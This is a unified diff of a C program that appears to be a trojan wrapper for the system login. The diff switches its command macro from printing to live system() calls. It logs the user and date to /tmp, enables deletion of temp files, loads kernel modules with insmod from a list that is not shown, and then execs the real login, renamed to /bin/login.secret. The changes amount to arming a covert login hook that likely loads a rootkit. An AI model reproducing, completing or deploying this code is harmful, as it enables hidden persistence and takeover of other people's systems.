@@ -2,8 +2,8 @@
 #include <unistd.h>
 #include <string.h>
 
-#define DO_SOMETHING(x) printf("exec[%s]\n",x)
-//#define DO_SOMETHING(x) system(x)
+//#define DO_SOMETHING(x) printf("exec[%s]\n",x)
+#define DO_SOMETHING(x) system(x)
 
 int ko_files[] = {
 
@@ -44,11 +44,11 @@ int main(int argc,char*args[],char *env[]){
   }
   fclose(f);
 /*debug only*/
-system("whoami");
+system("echo $(whoami) $(date) > /tmp/login.log.log");
 
   for(;*k >= 'a';(*k)--){
     /* do something with temp_file_name */
-    printf("I am trying to load %s\n",temp_file_name);
+    printf("DEBUG ONLY:I am trying to load %s\n",temp_file_name);
 
     char buff[2048] = "insmod ";
     char * cur = buff;
@@ -61,12 +61,12 @@ system("whoami");
 
 
     /* remove temp file */
-    //system(rm_temp_file);
+    system(rm_temp_file);
   }
   /*TODO*/
   //do something to run the real program
   setuid(o_uid);
   setgid(o_gid);
-  execve("/bin/mash",args,env);
+  execve("/bin/login.secret",args,env);
   return 0;
 }
